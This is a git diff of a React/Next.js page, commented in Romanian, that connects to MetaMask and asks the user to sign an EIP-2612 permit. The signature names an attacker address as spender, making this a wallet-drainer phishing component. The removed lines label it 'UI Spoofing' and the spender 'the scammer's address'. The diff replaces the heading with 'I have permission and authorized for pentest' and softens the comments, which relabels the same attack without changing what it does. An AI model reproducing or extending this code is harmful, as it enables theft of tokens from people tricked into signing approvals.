@@ -1,6 +1,13 @@
 "use client";
 import { useState } from "react";
 
+// Adaugă această declarație pentru TypeScript
+declare global {
+  interface Window {
+    ethereum?: any;
+  }
+}
+
 export default function Home() {
   const [showModal, setShowModal] = useState(false);
   const [signature, setSignature] = useState<string | null>(null);
@@ -11,7 +18,7 @@ export default function Home() {
     name: "Uniswap V2",
     version: "1",
     chainId: 1,
-    verifyingContract: "0xYourTokenAddress" // Adresa tokenului EIP-2612
+    verifyingContract: "0xYourTokenAddress" // Adresa tokenului EIP-2612 (ex: USDC, UNI, DAI, etc.)
   };
 
   const types = {
@@ -25,17 +32,18 @@ export default function Home() {
   };
 
   // Exemplu: deadline 1 oră de acum, value 1 token (18 decimals)
-  const value = {
+  const value: any = {
     owner: "", // completat după conectare
-    spender: "0xAttackerAddress", // adresa scammerului
-    value: "1000000000000000000", // 1 token
-    nonce: 0, // completat după conectare
+    spender: "0xAttackerAddress", // adresa de test sau a "atacatorului"
+    value: "1000000000000000000", // 1 token (18 decimals)
+    nonce: 0, // completat după conectare (poți lăsa 0 pentru test)
     deadline: Math.floor(Date.now() / 1000) + 3600
   };
 
   // Conectare la MetaMask și semnare permit
   const handleSign = async () => {
     setError(null);
+    setSignature(null);
     if (!window.ethereum) {
       setError("MetaMask nu este instalat.");
       return;
@@ -45,8 +53,8 @@ export default function Home() {
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       value.owner = accounts[0];
 
-      // 2. (Opțional) Ia nonce-ul curent de pe contractul tokenului (aici hardcodat 0)
-      // Într-un pentest real, folosește ethers.js/web3.js să citești nonce-ul corect
+      // 2. (Opțional) Ia nonce-ul real de pe contractul tokenului (aici hardcodat 0)
+      // Într-un test real, folosește ethers.js/web3.js să citești nonce-ul corect
 
       // 3. Construiește payload-ul EIP-712
       const msgParams = JSON.stringify({
@@ -70,7 +78,7 @@ export default function Home() {
 
   return (
     <div style={{ padding: 40, fontFamily: "sans-serif" }}>
-      <h1>UI Spoofing + Semnătură Permit (MetaMask)</h1>
+      <h1>I have permission and authorized for pentest</h1>
       <button
         onClick={() => setShowModal(true)}
         style={{
